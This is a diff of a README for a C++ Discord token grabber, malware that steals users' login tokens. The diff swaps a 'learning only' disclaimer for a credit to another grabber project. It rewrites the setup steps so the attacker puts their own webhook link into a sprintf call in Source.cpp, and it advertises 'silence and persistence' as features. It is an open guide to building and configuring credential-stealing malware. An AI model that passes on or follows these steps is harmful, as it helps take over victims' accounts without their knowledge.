@@ -6,9 +6,8 @@
 
 </p>
 
-A C++ token grabber that anyone can use, please do not "paste" or steal this code
-because you will regret it. The whole point of this is learning. If I didn't want to
-learn I could easily just grab a Python token grabber and use py2exe on it.
+A C++ token grabber that anyone can use, credit to [NightFallGT](https://github.com/NightfallGT/Discord-Token-Grabber/blob/master/Token-Disc/Token-Disc.cpp)
+and his token grabber, I used his "findMatch" function in order to fix a couple issues I was having.
 
 ## Pros
      - Silence and persistence
@@ -27,7 +26,7 @@ learn I could easily just grab a Python token grabber and use py2exe on it.
 You will need **Visual studio 2019** and visual C++ SDK installed.
 
 Download the .zip folder from releases, extract it to a folder `e.g: MyProjectFolder`
-Next, open the .sln file and once loaded go to the `settings.h` file.
+Next, open the .sln file and once loaded go to the `Source.cpp` file, then find the webhook link
+inside of the sprintf call and change it to desired link.
 
-Change the "WEBHOOK" variable to your webhook.
 Press ctrl + b and enjoy!
